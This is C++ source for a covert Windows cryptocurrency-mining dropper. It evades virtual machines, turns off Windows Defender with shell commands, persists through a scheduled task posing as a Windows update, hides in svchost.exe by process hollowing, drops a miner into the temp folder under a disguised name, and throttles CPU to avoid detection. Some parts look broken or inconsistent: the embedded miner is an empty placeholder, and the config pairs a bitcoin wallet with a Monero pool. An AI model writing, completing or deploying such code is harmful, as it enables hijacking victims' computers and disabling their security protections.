#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <thread>
#include <string>
#include <fstream>
#include <shlobj.h>
#include <curl/curl.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "curl.lib")

// XMRig config (replace with your pool/wallet)
#define MINER_CONFIG "--url=xmrpool.eu:9999 --user=bc1qzmt8sucrml50vr0kjh73d3f0w54zsc5gk602m8 --pass=x --donate-level=1 --coin=bitcoin --tls"

// Hidden miner executable (embedded or downloaded)
const BYTE miner_binary[] = { /* XMRig binary in byte array */ };

// Anti-VM check (basic)
bool IsVirtualMachine() {
    unsigned int hypervisor_bit;
    __asm {
        mov eax, 1
        cpuid
        bt ecx, 31
        setc hypervisor_bit
    }
    return hypervisor_bit;
}

// Process hollowing (hide in legit process)
void HollowProcess(LPCSTR targetProc) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessA(NULL, (LPSTR)targetProc, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(pi.hThread, &ctx);

        LPVOID imageBase;
#ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 16), &imageBase, sizeof(LPVOID), NULL);
#else
        ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 8), &imageBase, sizeof(LPVOID), NULL);
#endif

        LPVOID newImage = VirtualAllocEx(pi.hProcess, imageBase, sizeof(miner_binary), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(pi.hProcess, newImage, miner_binary, sizeof(miner_binary), NULL);

#ifdef _WIN64
        ctx.Rax = (DWORD64)newImage;
#else
        ctx.Eax = (DWORD)newImage;
#endif
        SetThreadContext(pi.hThread, &ctx);
        ResumeThread(pi.hThread);
    }
}

// Disable Windows Defender real-time protection
void KillDefender() {
    system("net stop WinDefend >nul 2>&1");
    system("powershell -command \"Set-MpPreference -DisableRealtimeMonitoring $true\" >nul 2>&1");
}

// Persistence via scheduled task
void InstallPersistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    system(("schtasks /create /tn \"WindowsUpdateTask\" /tr \"" + std::string(path) + "\" /sc onstart /f /rl highest").c_str());
}

// CPU throttling to avoid detection
void AdjustUsage() {
    while (true) {
        DWORD busyTime = 10; // 10ms
        DWORD idleTime = busyTime * 3; // 30% CPU usage
        auto startTime = GetTickCount();
        while ((GetTickCount() - startTime) <= busyTime);
        Sleep(idleTime);
    }
}

// Main execution
int main() {
    if (IsVirtualMachine()) ExitProcess(0); // Exit if VM detected
    
    KillDefender();
    InstallPersistence();
    
    std::thread throttle(AdjustUsage);
    HollowProcess("svchost.exe"); // Hide in svchost
    
    // Drop and execute miner
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat_s(tempPath, "\\dllhost.dat");
    
    std::ofstream miner(tempPath, std::ios::binary);
    miner.write((const char*)miner_binary, sizeof(miner_binary));
    miner.close();
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)("cmd /c start /min " + std::string(tempPath) + " " + MINER_CONFIG).c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    
    throttle.join();
    return 0;
}
